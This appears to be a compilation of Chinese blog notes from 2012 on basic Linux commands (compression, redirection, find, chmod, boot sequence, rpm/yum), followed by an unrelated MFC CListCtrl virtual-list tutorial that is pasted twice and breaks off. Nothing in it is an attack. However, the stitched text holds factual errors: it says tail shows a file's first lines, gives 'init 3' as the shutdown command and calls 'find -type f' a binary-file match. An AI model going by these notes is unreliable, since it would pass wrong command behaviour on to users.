zip解压缩命令.zip默认的win和linux通用的格式
语法：zip 选项-r 
              -r压缩目录
zip services.zip /etc/services
压缩文件
zip -r test.zip /test
压缩目录
 
解压缩命令：
unzip功能描述：解压.zip的压缩文件
范例：unzip test.zip
压缩解压缩命令：bzip2
bzip2 选项-k
          -k产生压缩文件 保留源文件
范例：bzip2 -k file1 
 
 
网络通信命令：
指令名称：write指令所在路径：/usr/bin/write
语法：write<用户名>
向另外一个用户发信息，以ctrl+d作为结束
范例：write samlee
 
wall命令：广播信息。所用linux的用户都能收到
 
 
shutdown -h now 立即关机
系统关机命令：reboot 功能：重启系统
 
命令别名的定义：alias copy=cp                alias xrm=“rm -r” 带选项的用双引号括起来
查看别名信息：alias
删除别名 ：unalias copy
 
 
输入输出重定向
同标准IO一样，shell对于每一个进程预先定义3个文件描述字
0 STDIN 标准输入
1 STDOUT标准输出
2 STDERR标准错误输出
>或者>>输出重定向
ls -l /tmp> /tmp.msg
date >> /tmp        追加结果
< 输入重定向
范例：wall < /etc/motd
2>错误输出重定向
范例：cp -R /usr/backup/usr/bak 2> /bak/error
 
 
管道
：将一个命令的输出传送给另一个命令，作为另一个命令的输入
使用方法：
命令1|命令2
范例：
ls-l /etc |more
ls -l /etc|grep init |wc -l
相当于统计出了在/etc目录下包含关键字init 的文件有几个
 
 
；
间隔的个命令按照顺序依次执行
&&
前后命令的执行存在逻辑关系只有&&前面的命令执行成功后，它后面的命令才能被执行
||
前后命令的执行存在逻辑关系，只有||前的命令执行失败后它后面的命令才会执行
 






                                            
 
2012-3-2
linux用户管理
用户信息文件：/etc/passwd
密码文件:/etc/shadow
用户组文件:/etc/group
用户组密码文件:/etc/gshadow
用户配置文件: /etc/login.defs  etc/default/useradd
新用户信息文件:/etc/ske 1
登陆信息:/etc/motd

linux用户分为三种:
超级用户:(root,UID =0)
普通用户:(UID:500-60000)
伪用户:(UID 1-499)

echo "123456" |md5sum ---产生123456的md5 加密密码
man 5 shadow 查看/etc/shadow中shadow的帮助,
 





 
centos6.0如果采用默认的最小化安装是没有安装桌面环境的，因此需要手动安装桌面环境。
我们可以用 #yum grouplist 查看已经安装的组件，以及支持安装的组件 首先，安装 X window system# yum groupinstall "
X Window system"由于centos6.0中只支持KDE组件，因此，安装KDE桌面环境#yum groupinstall "KDE Desktop"

开机为文本界面，由文本界面切换到图形界面：
    方法1：运行命令
          #startx ， 需要先配置图形界面信息
    方法2：修改/etc/inittab文件中的 
          id:3:initdefault ， 将3改为5 ，重新启动系统； 
    方法3：进入图形界面： init 5
 从图形界面进入文本界面： init 3
 重启： init 6
 关机： init 3 
真机环境中，在图形界面和文本界面间快捷键切换：
    Ctrl+Alt+F(n) , 其中F(n)为F1-F6 ，为6个控制台；
    Ctrl+ALT+F7 ；
eg:CTRL+ALT+F1是进入文本界面，CTRL+ALT+F7才是图形界面。
 

centos 下shutdown的命令后跟时间的单位是分钟
shutdown 60是60分钟后关机。

2012-1-20
从新安装了centos，选择desktop 安装桌面以及xwindows环境。1063个软件包。
2012-2-2
1.除了/之外所有字符都合法
2.有的字符，空格符，制表符，退格符和@#最好不要使用
3.避免使用.作为普通文件名的第一个字符。（.开头表示隐藏文件）
4.大小写敏感






 
2012-2-4
文件处理命令：cat 命令英文原意： concateate and display files
命令所在路径：/bin/cat
执行权限：所有用户
语法：cat[文件名]
功能描述：显示文件内容
范例：$cat/etc/issue
      $cat/etc/services
文件处理命令：more  //可以分页显示文件
范例：$more /etc/services
语法：more【文件名】
     （空格）或f    显示下一页
      （Enter）     显示下一行
      q或Q        退出 
     
文件处理命令：head 查看文件的前几行
head -num[文件名]
范例：$head -5 /etc/services
文件处理命令：tail查看文件的前几行
tail -num[文件名]
tail -f  动态显示更新内容
范例：$tail -5 /etc/services
 
文件处理命令 ：ln 
命令的英文原意：link
语法：ln -s[源文件][目标文件]
范例： $ln -s /etc/issue /issue.soft
软链接文件的权限： lrwxrwxrwx-->指向源文件，只是一个符号链接
时间值：软链接创建时候的时间值
类似于windows的快捷方式。
硬链接：ln /etc/issue /issue.hard
我们发现硬链接所有的属性和源文件相同。
硬链接的大小和源文件的大小一样，而且是和源文件同步更新的
ls -i i-inode i节点
内核需要处理响应的数字表示来确认相应的对象，每个文件必须有一个i节点。
但并不是一个i节点就对应一个文件。
硬链接和源文件有相同的i节点，软连接和源文件的i节点不同
所以硬链接和源文件可以同时更新。
 
权限处理命令：chmod
命令的英文原意：
语法 chmod [{ugo}{+-=}{rwx}][文件或目录]
           [mode=421][文件或目录]
功能描述：改变文件或目录的权限
chmod u +
      g -
      o =
u--所有者
g--所属组
o--其他人
rwx 可读可写可执行
ls -a a
chmod u+wx 文件或目录
chmod o-rx
chmod g=rwx
rwx 可读可写可执行
r-4
w-2
x-1
数字代表相应的权限
rwx r-x r--
7   5   4
rw- r-x --x
6   5   1
chmod 641 a 也可以改变权限
对文件有r权限
r-cat more head tail
w-echo vi 对一个文件具有写权限并不代表能够删除文件
x-命令，脚本
目录的权限
r-表示可以列出目录中的内容
w-表示可以在目录中创建删除文件touch， mkdir，rm
x-表示可以进入这个目录
 
 
权限管理命令：chown
改变文件的所有者
chgrp：改变文件的所属组
 
 
权限管理命令：umask
默认创建文件的权限掩码值
umask -S
 
 
linux权限规则：
缺省创建的文件不能授予可执行x权限（因此比较安全）






 
2012-2-8 星期三
文件搜索命令:

which [命令名称]
功能：显示系统命令所在目录(绝对路径)

$which ls
whereis可以表现出命令的帮助信息，帮助文件说存放的信息
 

find --通用查找命令

语法：find[搜索路径][搜索关键字]
功能：查找文件或目录
 
-name 根据文件名来查找
find /etc -name init
在目录/etc中查找文件init（只匹配文件名init，通配符*匹配任意字符包括零个字符）
init* ： 以init开头的文件
？：匹配单个字符 init？？？：init后面还有三个符号
-size 文件大小 block数据块 512字节
100MB=102400kb=204800数据块block（只支持数据块的表示方法）
find /-size+204800
在根目录下查找大于100mb的文件
（大于+  小于-    等于 ）
find /home -user samlee
在根目录下查找所有者为samlee的文件
 
时间
1.ctime ，atime ，mtime天为单位
2.cmin，amin，mmin分钟为单位
c-change改变，表示文件的属性被修改过
a-access访问
m-modify修改 ，表示文件的内容被修改过
-之内
+超过
 
find /etc -mmin -120
find /etc -ctime -1


在/etc下查找24小时内被修改过属性的文件和目录
find /etc -size +163840 -a -size -204800

在/etc下查找大于80mb小于100mb的文件
find /etc -name inittab -exec ls -l{} \;

在/etc 下查找inittab文件并显示其详细信息

-type 文件类型 f 二进制文件 l 软链接文件 d 目录
1.连接符 -a and 逻辑与 -o or 逻辑或
2.连接符 find .....-exec 命令 {} \;
                              {}find查询的结果
                               \转义符，使用符号命令本身的意思
                   -ok 询问确认
 


无论文件名叫什么都可以根据文件的i节点来进行查找
内核才能调用他。
 

文件搜索命令：locate

locate（搜索关键字）
列出所有跟file相关的文件
文件搜索命令：updatedb
执行权限：root
语法：updatedb
功能描述：建立整个系统目录文件的数据库
范例：#updatedb
 
文件搜索命令：grep


语法：grep[指定字串][源文件]
功能描述：在文件中搜索字串匹配的行并输出
范例：grep ftp /etc/services
 

帮助命令：
命令名称：man

命令的英文原意：manual
命令所在的路径：/user/bin/man
执行权限：所用用户
语法：man[命令或者配置文件]
功能描述：获得帮助信息
man ls 查看ls命令的帮助信息
man services 查看配置文件services的帮助信息
 
 
帮助指令：info
语法：info[任何关键字]
功能描述：获得帮助信息{unix中没有这个命令}
 
帮助命令：whatis

whatis whatis
指令名称：whatis apropos makewhatis
search the whatis database for strings
 
语法：whatis apropos [任何关键字]
功能描述：获得索引的简短说明信息
apropos fstab 相当于man -k
补充命令：help 查看shell内置命令的帮助
 
linux 常用命令：压缩解压命令

-gz
命令的英文原意：Gnu zip
语法：gzip 选项[文件]
功能描述：压缩文件
压缩后文件格式： .gz
1. 只能压缩文件，不能压缩目录
2.不保留源文件
 
解压缩命令：gunzip
语法：gunzip选项[压缩文件]
功能描述：解压缩.gz的压缩文件
范例：gunzip file1.gz
压缩解压目录：tar
命令名称：tar
语法 tar选项[cvf][目录]
     -c 产生.tar打包文件
     -v 显示详细信息
     -f 指定压缩后的文件名
     -z 打包的同时压缩
压缩后的文件格式：.tar.gz






                                            
 
2012-2-13
linux 引导流程
1.固件firmware（cmos，bios）-》post加点自检
2.自举程序Bootloader（grub）-》载入内核
3.载入内核                  -》驱动硬件
4.启动进程init              -》系统启动的第一个进程
5.读取执行配置文件 /etc/inittab
 
master boot record->MBR主引导扇区 位置：0驻面0磁头1扇区
插入图片：
bootloader中存放的是自举程序：
windows中为：--》ntldr 以及 boot.ini文件中的内容
linux中为：  --》/etc/grub.conf
 
 
init的工作：
init启动后读取inittab文件，执行缺省运行级别而继续从而引导过程。在unix系统中
，init时第一个可以存在的进程，它的PID恒为1，但他也同时必须向一个更高级的功能负责
：PID为0的内核调度器（kernel scheduler），从而获得cpu时间
 
 
 

inittab 文件剖析

在inittab中，所有的条目采取以下格式：
id：run-level:action:process
id:标示符，一般为两位数字或者字母或者数字
run—level：指定运行级别可以指定多个
action：指定运行状态
process：指定要运行的脚本/命令
 
action常用取值：
initdefault：指定系统缺省启动的运行级别
sysinit：系统启动执行process中的运行级别
wait：执行process中指定的命令，并等起结束再运行其他命令
once：执行process中指定的命令，不等待其结果
ctrlaltdel：按下Ctrl+alt+del时执行process指定的命令
powerfail：当出现电源错误时执行process指定的命令，不等待其结束
powerokwait：当电源恢复是执行process指定的命令
respawn：一旦process指定的命令中止，便重新运行该命名
 
任何的系统级别都会起动系统的启动脚本：
/etc/rc.d/rc.sysinit         
ls /etc/rc.d/rc3.d 可以看到系统启动对应级别下需要执行的脚本操作
/etc/rc.d/rc[0123456].d
分别存放对应于运行级别的服务程序脚本的符号链接，链接到init.d目录中相应的脚本
 
比如：s12syslog
s—start
k—kill
数字
脚本名称
 
启动流程：插入图片：

 
 






                                            
 
2012-2-14 linux 软件包的管理
 
1.二进制软件包管理（RPM,YUM）
2.源代码包安装
3.脚本安装（shell或者java脚本）
4.debian系linux软件包管理简介
 
强行卸载-》插入图片


命令：rpm -e --nodeps samba
 
1.rpm包管理： 插入图片
 

2.rpm安装选项：插入图片

3.rpm覆盖安装：插入图片

 
4.文件冲突： 插入图片

 
5.文件依赖关系：


应用yum 的好处
1.自动解决软件包的依赖关系
2.方便的软件包的升级
yum包管理：图片
 
6.rpm包管理：
 
 





    
        clistctrl 虚拟列表             

       

一、什么是虚拟列表控件
虚拟列表控件是指带有LVS_OWNERDATA风格的列表控件。。
二、为什么使用虚拟列表控件
我们知道，通常使用列表控件CListCtrl，需要调用InsertItem把要显示的数据插入列表中，之后我们就不必关心数据在哪里了，这是因为控件自己开辟了内存空间来保存这些数据。现在假设我们要显示一个数据库，里面的信息量很大，有几十万条记录。通常有两种方法解决这个问题：1是仅仅在ListCtrl中插入少量的数据，比如100个，然后通过[上一页][下一页]两个按钮进行控制，某一时刻显示的只是从xxx到xxx+100之间的记录。2是把所有数据全部插入到ListCtrl中，然后让用户通过滚动来查看数据。无疑，很多用户喜欢采用第二种方式，特别是对于已经排序的数据，用户只需用键盘输入某行的开头字符，就可以快速定位到某一行。但是，如果这样做，InsertItem插入数据的过程将是很漫长的，而且用户会看到ListCtrl刷新速度也很慢，而且所有数据都位于内存中消耗了大量的内存，当数据多达上万以后几乎是不能忍受的。
为此，mfc特别提供了虚拟列表的支持。一个虚拟列表看起来和普通的ListCtrl一样，但是不用通过InsertItem来插入数据，它仅仅知道自己应该显示多少数据。但是它如何知道要显示什么数据呢？秘密就在于当列表控件需要显示某个数据的时候，它向父窗口要。假设这个列表控件包含100个元素，第10到20个元素（行）是可见的。当列表控件重画的时候 ，它首先请求父窗口给它第10个元素的数据，父窗口收到请求以后，把数据信息填充到列表提供的一个结构中，列表就可以用来显示了，显示第10个数据后，列表会继续请求下一个数据。
在虚拟的样式下，ListCtrl可以支持多达DWORD个数据项。(缺省的listctrl控件最多支持int个数据项)。但是，虚拟列表的最大优点不在于此，而是它仅仅需要在内存中保持极少量的数据，从而加快了显示的速度。所以，在使用列表控件显示一个很大的数据库的情况下，采用虚拟列表最好不过了。
不仅CListCtrl提供虚拟列表的功能， MFC的CListView类也有同样的功能。
三、虚拟列表控件的消息
虚拟列表总共发送三个消息给父窗口：当它需要数据的时候，它发送LVN_GETDISPINFO消息。这是最重要的消息。当用户试图查找某个元素的时候，它发送LVN_ODFINDITEM消息；还有一个消息是LVN_ODCACHEHINT，用来缓冲数据，基本上很少用到这个消息。
虚拟列表控件使用起来非常简单。它总共只有三个相关的消息，如果你直接使用CListCtrl，应该在对话框中响应这三个消息。如果你使用CListCtrl派生类，可以在派生类中响应这三个消息的反射消息。这三个消息分别是：
  （1）LVN_GETDISPINFO 控件请求某个数据
  （2）LVN_ODFINDITEM  查找某个数据
  （3）LVN_ODCACHEHINT 缓冲某一部分数据
我们必须响应的消息是（1），多数情况下要响应(2)，极少数的情况下需要响应（3）
四、如何使用虚拟列表控件
1、首先要创建控件，创建一个虚拟列表和创建一个正常的 CListCtrl差不多。先在资源编辑器里面添加一个list control资源。然后选中"Owner data"属性，然后给它捆绑一个CListCtrl变量。添加列，添加imagelist等都和使用正常的listctrl一样。
2、给虚拟列表添加元素。假设 m_list 是这个列表的控制变量。通常的情况下这样添加数据：
m_list.InsertItem(0, _T("Hello world"));
但是对于虚拟列表，不能这么做。只需告诉列表有多少个数据:
//总共显示100行
m_list.SetItemCount(100);
3、处理它的通知消息。
五、如何响应虚拟列表的消息
1、处理 LVN_GETDISPINFO 通知消息
当虚拟列表控件需要某个数据的时候，它给父窗口发送一个 LVN_GETDISPINFO通知消息，表示请求某个数据。因此列表的所有者窗口（或者它自己）必须处理这个消息。例如派生类的情况 (CMyListCtrl是一个虚拟列表类对象):
//这里处理的是反射消息
BEGIN_MESSAGE_MAP(CMyListCtrl, CListCtrl)
   //{{AFX_MSG_MAP(CMyListCtrl)
   ON_NOTIFY_REFLECT(LVN_GETDISPINFO, OnGetdispinfo)
   //}}AFX_MSG_MAP
END_MESSAGE_MAP()
在LVN_GETDISPINFO的处理函数中，必须首先检查列表请求的是什么数据，可能的值包括:
（1）LVIF_TEXT   必须填充 pszText
（2）LVIF_IMAGE  必须填充 iImage 
（3）LVIF_INDENT 必须填充 iIndent
（4）LVIF_PARAM  必须填充 lParam 
（5）LVIF_STATE  必须填充 state 
根据它的请求，填充所需的数据即可。
//================= 例子代码=====================================
下面的给出一个例子，填充的是列表所需的某个数据项的文字以及图像信息：
LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
LV_ITEM* pItem= &(pDispInfo)->item;
int iItemIndx= pItem->iItem;
if (pItem->mask & LVIF_TEXT) //字符串缓冲区有效
{
    switch(pItem->iSubItem){
        case 0: //填充数据项的名字
            lstrcpy(pItem->pszText,m_Items[iItemIndx].m_strItemText);
            break;
        case 1: //填充子项1
            lstrcpy(pItem->pszText,m_Items[iItemIndx].m_strSubItem1Text);
            break;
        case 2: //填充子项2
            lstrcpy(pItem->pszText,m_Items[iItemIndx].m_strSubItem2Text);
            break;
    }
}
/*注意，多数情况下要使用lstrcpyn ，因为最多复制字符的个数由pItem->cchTextMax给出：
        lstrcpyn(pItem->pszText, text, pItem->cchTextMax);
*/
if (pItem->mask & LVIF_IMAGE) //是否请求图像
        pItem->iImage= m_Items[iItemIndx].m_iImageIndex;
甚至连某行数据是否选中（当有checkbox的情况下）的信息也需要由用户自己来维护，例如：
//是否显示该行的选择信息?
if(IsCheckBoxesVisible()) //自定义函数
{
    pItem->mask |= LVIF_STATE;
    pItem->stateMask = LVIS_STATEIMAGEMASK;
    if(m_database[itemid].m_checked)
    {
         pItem->state = INDEXTOSTATEIMAGEMASK(2);
    }
    else
    {
         pItem->state = INDEXTOSTATEIMAGEMASK(1);
     }
}
2、处理 LVN_ODFINDITEM 消息
在资源管理器里面，定位到某个文件夹，会显示很多文件，如果按下键盘的‘A’，则资源管理器会自动找到名字以 'A'打头的文件夹或者文件, 并选择该文件。继续按 A，如果还有其它名字以'A'打头的文件，则下一个文件被选中。如果输入 "AB"，则 'AB'打头的文件被选中。这就是列表控件的自动查找功能。
当虚拟列表收到一个LVM_FINDITEM消息，它也会发送这个消息通知父窗口查找目标元素。要搜索的信息通过 LVFINDINFO 结构给出。它是 NMLVFINDITEM 结构的一个成员。当找到要搜索的数据后，应该把该数据的索引（行号）返回，如果没有找到，则返回-1。
以对话框为例，响应函数大致如下:
//================= 例子代码=====================================
void CVirtualListDlg::OnOdfinditemList(NMHDR* pNMHDR, LRESULT* pResult) 
{
    // pNMHDR 里面是要查找的元素的信息
    // 要选中的目标元素的行号最后要保存在 pResult 中， 这是关键！
    NMLVFINDITEM* pFindInfo = (NMLVFINDITEM*)pNMHDR;
    /* pFindInfo->iStart 是查找的起始位置，一直到最后，然后从头开始，如果没有找到合适的，最终停留在iStart*/
    *pResult = -1;
    //是否按照文字查找？
    if( (pFindInfo->lvfi.flags & LVFI_STRING) == 0 )
    {
        return;
    }
    //这是我们要找的字符串
    CString searchstr = pFindInfo->lvfi.psz;
    int startPos = pFindInfo->iStart;//保存起始位置
    //判断是否最后一行
    if(startPos >= m_list.GetItemCount())
        startPos = 0;
    int currentPos=startPos;
    
    //开始查找
    do
    {        
        if( _tcsnicmp(m_database[currentPos].m_name, 
                 searchstr, searchstr.GetLength()) == 0)
        {
            //选中这个元素，停止查找
            *pResult = currentPos;
            break;
        }
        currentPos++;
        //从头开始
        if(currentPos >= m_list.GetItemCount())
            currentPos = 0;
    }while(currentPos != startPos);       
}
显然，如果数据很多，必须实现一个快速查找的方法。
关于pFindInfo->lvfi里面的信息的详细说明可以参考 MSDN。
3、处理 LVN_ODCACHEHINT 消息。
假如我们从数据库或者其它地方读取数据的速度比较慢，则可以利用这个消息，批量读取一些数据，然后根据请求，逐个提供给虚拟列表。LVN_ODCACHEHINT消息的用途就是给程序一个缓冲数据的机会。以提高程序的性能。
//================= 例子代码=====================================
使用 ClassWizard 重载 OnChildNotify 函数，检查是否 LVN_ODCACHEHINT 消息，然后准备缓冲数据：
NMLVCACHEHINT* pcachehint=NULL;
NMHDR* phdr = (NMHDR*)lParam;
if(phdr->code == LVN_ODCACHEHINT)
{
     pcachehint= (NMLVCACHEHINT*) phdr;
     //自定义函数，准备指定范围的数据到缓冲区
     PrepCache(pcachehint->iFrom, pcachehint->iTo);
}
else ...
注意，如果消息不是 LVN_ODCACHEHINT，则要传递给基类进行处理。
五、如何修改ListCtrl显示的数据。
由于是程序自己维护数据，所以只需修改数据库中的数据，然后调用CListCtrl::RedrawItems函数进行重画即可。
六、数据的选择状态和选择框
CListCtrl可以显示checkbox选择框。有些情况下是很有用的。对于正常的listctrl，用户可以用鼠标来修改某个元素的选择状态，但是对于虚拟列表就不行了。必须自己处理一些消息，然后自己保存数据的选中状态:
void CVirtualListDlg::ToggleCheckBox(int item)
{
    m_database[item].m_checked = !m_database[item].m_checked;
    m_list.RedrawItems(item, item);
}
处理 LVN_KEYDOWN消息，添加对空格键 的响应，用于切换选择状态：
void CVirtualListDlg::OnKeydownList(NMHDR* pNMHDR, LRESULT* pResult)
{
    LV_KEYDOWN* pLVKeyDown = (LV_KEYDOWN*)pNMHDR;
    if( pLVKeyDown->wVKey == VK_SPACE )
    {
       int item = m_list.GetSelectionMark();
        if(item != -1)
            ToggleCheckBox(item);
    }
    *pResult = 0;
}
然后处理 NM_CLICK 消息:
void CVirtualListDlg::OnClickList(NMHDR* pNMHDR, LRESULT* pResult)
{
    NMLISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
    LVHITTESTINFO hitinfo;
    hitinfo.pt = pNMListView->ptAction;
    int item = m_list.HitTest(&hitinfo);
    if(item != -1)
    {
        //看看鼠标是否单击在 check box上面了?
        if( (hitinfo.flags & LVHT_ONITEMSTATEICON) != 0)
        {
            ToggleCheckBox(item);
        }
    }
    
    *pResult = 0;
}
七、备注：
    1、虚拟列表无法进行排序。
    2、虚表的一个优点是容易保持和数据库的同步。修改数据库中的数据，然后重画list十分容易而且高效。
    3、虚表的另一个优点是可以根据需要产生数据。比如在某一列加上行号。http://blog.vckbase.com/iwaswzq/archive/2006/07/07/21113.htmlhttp://www.codeproject.com/KB/list/virtuallist.aspx





一、什么是虚拟列表控件
虚拟列表控件是指带有LVS_OWNERDATA风格的列表控件。。
二、为什么使用虚拟列表控件
我们知道，通常使用列表控件CListCtrl，需要调用InsertItem把要显示的数据插入列表中，之后我们就不必关心数据在哪里了，这是因为控件自己开辟了内存空间来保存这些数据。现在假设我们要显示一个数据库，里面的信息量很大，有几十万条记录。通常有两种方法解决这个问题：1是仅仅在ListCtrl中插入少量的数据，比如100个，然后通过[上一页][下一页]两个按钮进行控制，某一时刻显示的只是从xxx到xxx+100之间的记录。2是把所有数据全部插入到ListCtrl中，然后让用户通过滚动来查看数据。无疑，很多用户喜欢采用第二种方式，特别是对于已经排序的数据，用户只需用键盘输入某行的开头字符，就可以快速定位到某一行。但是，如果这样做，InsertItem插入数据的过程将是很漫长的，而且用户会看到ListCtrl刷新速度也很慢，而且所有数据都位于内存中消耗了大量的内存，当数据多达上万以后几乎是不能忍受的。
为此，mfc特别提供了虚拟列表的支持。一个虚拟列表看起来和普通的ListCtrl一样，但是不用通过InsertItem来插入数据，它仅仅知道自己应该显示多少数据。但是它如何知道要显示什么数据呢？秘密就在于当列表控件需要显示某个数据的时候，它向父窗口要。假设这个列表控件包含100个元素，第10到20个元素（行）是可见的。当列表控件重画的时候 ，它首先请求父窗口给它第10个元素的数据，父窗口收到请求以后，把数据信息填充到列表提供的一个结构中，列表就可以用来显示了，显示第10个数据后，列表会继续请求下一个数据。
在虚拟的样式下，ListCtrl可以支持多达DWORD个数据项。(缺省的listctrl控件最多支持int个数据项)。但是，虚拟列表的最大优点不在于此，而是它仅仅需要在内存中保持极少量的数据，从而加快了显示的速度。所以，在使用列表控件显示一个很大的数据库的情况下，采用虚拟列表最好不过了。
不仅CListCtrl提供虚拟列表的功能， MFC的CListView类也有同样的功能。
三、虚拟列表控件的消息
虚拟列表总共发送三个消息给父窗口：当它需要数据的时候，它发送LVN_GETDISPINFO消息。这是最重要的消息。当用户试图查找某个元素的时候，它发送LVN_ODFINDITEM消息；还有一个消息是LVN_ODCACHEHINT，用来缓冲数据，基本上很少用到这个消息。
虚拟列表控件使用起来非常简单。它总共只有三个相关的消息，如果你直接使用CListCtrl，应该在对话框中响应这三个消息。如果你使用CListCtrl派生类，可以在派生类中响应这三个消息的反射消息。这三个消息分别是：
  （1）LVN_GETDISPINFO 控件请求某个数据
  （2）LVN_ODFINDITEM  查找某个数据
  （3）LVN_ODCACHEHINT 缓冲某一部分数据
我们必须响应的消息是（1），多数情况下要响应(2)，极少数的情况下需要响应（3）
四、如何使用虚拟列表控件
1、首先要创建控件，创建一个虚拟列表和创建一个正常的 CListCtrl差不多。先在资源编辑器里面添加一个list control资源。然后选中"Owner data"属性，然后给它捆绑一个CListCtrl变量。添加列，添加imagelist等都和使用正常的listctrl一样。
2、给虚拟列表添加元素。假设 m_list 是这个列表的控制变量。通常的情况下这样添加数据：
m_list.InsertItem(0, _T("Hello world"));
但是对于虚拟列表，不能这么做。只需告诉列表有多少个数据:
//总共显示100行
m_list.SetItemCount(100);
3、处理它的通知消息。
五、如何响应虚拟列表的消息
1、处理 LVN_GETDISPINFO 通知消息
当虚拟列表控件需要某个数据的时候，它给父窗口发送一个 LVN_GETDISPINFO通知消息，表示请求某个数据。因此列表的所有者窗口（或者它自己）必须处理这个消息。例如派生类的情况 (CMyListCtrl是一个虚拟列表类对象):
//这里处理的是反射消息
BEGIN_MESSAGE_MAP(CMyListCtrl, CListCtrl)
   //{{AFX_MSG_MAP(CMyListCtrl)
   ON_NOTIFY_REFLECT(LVN_GETDISPINFO, OnGetdispinfo)
   //}}AFX_MSG_MAP
END_MESSAGE_MAP()
在LVN_GETDISPINFO的处理函数中，必须首先检查列表请求的是什么数据，可能的值包括:
（1）LVIF_TEXT   必须填充 pszText
（2）LVIF_IMAGE  必须填充 iImage 
（3）LVIF_INDENT 必须填充 iIndent
（4）LVIF_PARAM  必须填充 lParam 
（5）LVIF_STATE  必须填充 state 
根据它的请求，填充所需的数据即可。
//================= 例子代码=====================================
下面的给出一个例子，填充的是列表所需的某个数据项的文字以及图像信息：
LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
LV_ITEM* pItem= &(pDispInfo)->item;
int iItemIndx= pItem->iItem;
if (pItem->mask & LVIF_TEXT) //字符串缓冲区有效
{
    switch(pItem->iSubItem){
        case 0: //填充数据项的名字
            lstrcpy(pItem->pszText,m_Items[iItemIndx].m_strItemText);
            break;
        case 1: //填充子项1
            lstrcpy(pItem->pszText,m_Items[iItemIndx].m_strSubItem1Text);
            break;
        case 2: //填充子项2
            lstrcpy(pItem->pszText,m_Items[iItemIndx].m_strSubItem2Text);
            break;
    }
}
/*注意，多数情况下要使用lstrcpyn ，因为最多复制字符的个数由pItem->cchTextMax给出：
        lstrcpyn(pItem->pszText, text, pItem->cchTextMax);
*/
if (pItem->mask & LVIF_IMAGE) //是否请求图像
        pItem->iImage= m_Items[iItemIndx].m_iImageIndex;
甚至连某行数据是否选中（当有checkbox的情况下）的信息也需要由用户自己来维护，例如：
//是否显示该行的选择信息?
if(IsCheckBoxesVisible()) //自定义函数
{
    pItem->mask |= LVIF_STATE;
    pItem->stateMask = LVIS_STATEIMAGEMASK;
    if(m_database[itemid].m_checked)
    {
         pItem->state = INDEXTOSTATEIMAGEMASK(2);
    }
    else
    {
         pItem->state = INDEXTOSTATEIMAGEMASK(1);
     }
}
2、处理 LVN_ODFINDITEM 消息
在资源管理器里面，定位到某个文件夹，会显示很多文件，如果按下键盘的‘A’，则资源管理器会自动找到名字以 'A'打头的文件夹或者文件, 并选择该文件。继续按 A，如果还有其它名字以'A'打头的文件，则下一个文件被选中。如果输入 "AB"，则 'AB'打头的文件被选中。这就是列表控件的自动查找功能。
当虚拟列表收到一个LVM_FINDITEM消息，它也会发送这个消息通知父窗口查找目标元素。要搜索的信息通过 LVFINDINFO 结构给出。它是 NMLVFINDITEM 结构的一个成员。当找到要搜索的数据后，应该把该数据的索引（行号）返回，如果没有找到，则返回-1。
以对话框为例，响应函数大致如下:
//================= 例子代码=====================================
void CVirtualListDlg::OnOdfinditemList(NMHDR* pNMHDR, LRESULT* pResult) 
{
    // pNMHDR 里面是要查找的元素的信息
    // 要选中的目标元素的行号最后要保存在 pResult 中， 这是关键！
    NMLVFINDITEM* pFindInfo = (NMLVFINDITEM*)pNMHDR;
    /* pFindInfo->iStart 是查找的起始位置，一直到最后，然后从头开始，如果没有找到合适的，最终停留在iStart*/
    *pResult = -1;
    //是否按照文字查找？
    if( (pFindInfo->lvfi.flags & LVFI_STRING) == 0 )
    {
        return;
    }
    //这是我们要找的字符串
    CString searchstr = pFindInfo->lvfi.psz;
    int startPos = pFindInfo->iStart;//保存起始位置
    //判断是否最后一行
    if(startPos >= m_list.GetItemCount())
        startPos = 0;
    int currentPos=startPos;
    
    //开始查找
    do
    {        
        if( _tcsnicmp(m_database[currentPos].m_name, 
                 searchstr, searchstr.GetLength()) == 0)
        {
            //选中这个元素，停止查找
            *pResult = currentPos;
            break;
        }
        currentPos++;
        //从头开始
        if(currentPos >= m_list.GetItemCount())
            currentPos = 0;
    }while(currentPos != startPos);       
}
显然，如果数据很多，必须实现一个快速查找的方法。
关于pFindInfo->lvfi里面的信息的详细说明可以参考 MSDN。
3、处理 LVN_ODCACHEHINT 消息。
假如我们从数据库或者其它地方读取数据的速度比较慢，则可以利用这个消息，批量读取一些数据，然后根据请求，逐个提供给虚拟列表。LVN_ODCACHEHINT消息的用途就是给程序一个缓冲数据的机会。以提高程序的性能。
//================= 例子代码=====================================
使用 ClassWizard 重载 OnChildNotify 函数，检查是否 LVN_ODCACHEHINT 消息，然后准备缓冲数据：
NMLVCACHEHINT* pcachehint=NULL;
NMHDR* phdr = (NMHDR*)lParam;
if(phdr->code == LVN_ODCACHEHINT)
{
     pcachehint= (NMLVCACHEHINT*) phdr;
     //自定义函数，准备指定范围的数据到缓冲区
     PrepCache(pcachehint->iFrom, pcachehint->iTo);
}
else ...
注意，如果消息不是 LVN_ODCACHEHINT，则要传递给基类进行处理。
五、如何修改ListCtrl显示的数据。
由于是程序自己维护数据，所以只需修改数据库中的数据，然后调用CListCtrl::RedrawItems函数进行重画即可。
六、数据的选择状态和选择框
CListCtrl可以显示checkbox选择框。有些情况下是很有用的。对于正常的listctrl，用户可以用鼠标来修改某个元素的选择状态，但是对于虚拟列表就不行了。必须自己处理一些消息，然后自己保存数据的选中状态:
void CVirtualListDlg::ToggleCheckBox(int item)
{
    m_database[item].m_checked = !m_database[item].m_checked;
    m_list.RedrawItems(item, item);
}
处理 LVN_KEYDOWN消息，添加对空格键 的响应，用于切换选择状态：
void CVirtualListDlg::OnKeydownList(NMHDR* pNMHDR, LRESULT* pResult)
{
    LV_KEYDOWN* pLVKeyDown = (LV_KEYDOWN*)pNMHDR;
    if( pLVKeyDown->wVKey == VK_SPACE )
    {
       int item = m_list.GetSelectionMark();
        if(item != -1)
            ToggleCheckBox(item);
    }
    *pResult = 0;
}
然后处理 NM_CLICK 消息:
void CVirtualListDlg::OnClickList(NMHDR* pNMHDR, LRESULT* pResult)
{
    NMLISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
    LVHITTESTINFO hitinfo;
    hitinfo.pt = pNMListView->ptAction;
    int item = m_list.HitTest(&hitinfo);
    if(item != -1)
    {
        //看看鼠标是否单击在 check box上面了?
        if( (hitinfo.flags & LVHT_ONITEMSTATEICON) != 0)
        {
            ToggleCheckBox(item);
        }
    }
    
    *pResult = 0;
}
七、备注：
    1、虚拟列表无法进行排序。
